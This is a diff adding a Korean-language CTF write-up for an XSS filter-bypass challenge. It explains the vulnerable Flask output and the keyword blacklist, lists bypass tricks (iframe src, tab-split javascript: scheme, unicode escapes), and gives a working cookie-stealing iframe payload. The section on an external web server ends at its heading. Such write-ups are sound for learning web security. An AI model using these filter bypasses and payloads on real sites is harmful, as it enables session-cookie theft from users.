@@ -112,3 +112,32 @@ app.run(host="0.0.0.0", port=8000)
 <br/><br/>
 
 ## 문제 풀이
+### 취약점이 존재하는 부분
+vuln 페이지에서 전달된 탬플릿 변수를 기록할 때 HTML 엔티티 코드로 변환하여 저장하기 때문에 XSS 취약점이 발생하지 않는 ```render_template``` 함수를 이용하지 않고 ```return```을 통해 이용자의 입력값을 페이지에 그대로 출력하기 때문에 XSS 취약점이 발생함
+* ```xss_filter()``` 함수를 이용한 필터링
+    - XSS Filtering Bypass 문제와 동일하게 ```script```, ```on```, ```javascript``` 키워드를 필터링하고 있지만, 키워드를 단순히 치환(제거)하는 방식을 사용하지 않고 키워드가 탐지되었을 경우 ```"filtered!!"``` 문자열을 반환함
+    - ```script```, ```on```, ```javascript```로 필터링을 수행한 다음 추가된 키워드인 ```window```, ```self```, ```this```, ```document```, ```location```, ```(```, ```)```, ```&#```로 다시 한 번 필터링을 진행하고 키워드가 탐지되었을 경우 ```"filtered!!"``` 문자열을 반환함
+* 필터링 키워드를 단순히 치환하는 방식이 아니라 ```"filtered!!"``` 문자열을 반환하는 방식이기 때문에 **키워드의 중첩 사용으로 우회가 불가능함**
+    - XSS 필터링을 우회하는 방법
+        | 우회 방법 | 설명 |
+        |---|------|
+        | **다른 태그와 속성 사용** | ```<script>``` 태그 대신에 ```<iframe>``` 태그의 ```src``` 속성을 이용함 |
+        | **정규화를 이용한 우회** | ```javascript:``` 스키마 사용을 필터링하고 있으므로 중간에 탭을 넣어 정규화를 통해 이를 우회함 |
+        | **Unicode escape sequence 이용** | ```document```, ```location```의 ```d```를 ```\u0064```, ```on```을 ```\u006f\u006e```로 변환하여 우회 |
+
+<br/><br/>
+
+### 익스플로잇
+#### 방법 1: memo 페이지 이용
+1. flag 포인트에서 ```<iframe src='javascr	ipt:\u0064ocument.locati\u006f\u006e.href = "/memo?memo=" + \u0064ocument.cookie;'/>```를 입력하고 제출 버튼을 클릭함
+    - ```<iframe src='javascript:document.location.href="/memo?memo="+document.cookie;'/>```를 입력한 것과 동일함
+  <img width="978" alt="memo_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/9e916426-df8a-4ee5-8786-994b60f8ca06">
+
+
+2. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
+  <img width="978" alt="memo_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/b1f5cc7d-a9ab-460e-933d-18b985663a56">
+
+<br/>
+
+#### 방법 2: 외부 웹 서버 이용
+
